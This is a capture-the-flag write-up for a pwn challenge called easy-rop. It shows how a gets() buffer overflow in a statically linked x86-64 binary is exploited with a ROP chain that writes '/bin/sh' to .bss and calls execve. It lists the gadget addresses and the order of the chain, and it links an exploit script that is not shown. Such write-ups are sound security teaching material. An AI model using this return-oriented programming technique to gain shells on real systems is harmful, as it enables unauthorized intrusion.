# Easy-ROP

### This is a simple ROP exploit.

```
file easy-rop
easy-rop: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=78fc05fd7938307a19ef9a1d0514d19126d62727, for GNU/Linux 3.2.0, not stripped
```

So the given binary is statically linked. 

The security protections for this binary are:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

As we can see NX is enabled. The libc is statically linked and some of the libc functions present in the binary will have the canary present in it, so the checksec shows that the canary is present for the given binary. Decompiling the given binary we can see that :

```

void main(void)

{
  char local_48 [64];
  
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stderr,(char *)0x0,2,0);
  alarm(0x40);
  puts("Welcome to the darkcon pwn!!");
  printf("Let us know your name:");
  gets(local_48);
  return;
}

```
The  ```__stack_chk_fail``` function is not present concluding there is no canary present in the main function.

By decompiling the main it just uses ```gets()``` function so we have a buffer overflow vulnerability. So we can change the **return address** to jump anywhere we want in the binary.


As the given binary is statically linked we will have so many ROPGadgets present in it. we can utilize these ROPgadgets to form a shellcode using ROP.

### So the attack vector is:

- Just try to write ```/bin/sh``` in any writable section (preferably in .bss)
- Then try to use syscall and execute the execve("/bin/sh") to get the shell

I used these ROP gadgets:

```
0x0000000000481e65 : mov qword ptr [rsi], rax ; ret
0x00000000004175eb : pop rax ; ret
0x000000000040191a : pop rdi ; ret
0x000000000040f4be : pop rsi ; ret
0x000000000040181f : pop rdx ; ret
0x00000000004012d3 : syscall
```

- pop rax  ** "/bin/sh" **
- pop rsi  ** (address of bss) **
- mov qword ptr [rsi], rax ** so the starting address of bss contains the /bin/sh **
- pop rax,0x3b ** execve syscall **
- pop rdi ** bss (pointer to "/bin/sh") **
- pop rsi ** 0 **
- pop rdx ** 0 **
- syscall

Here is the full [Exploit](./exploit.py) 

Enjoy the shell
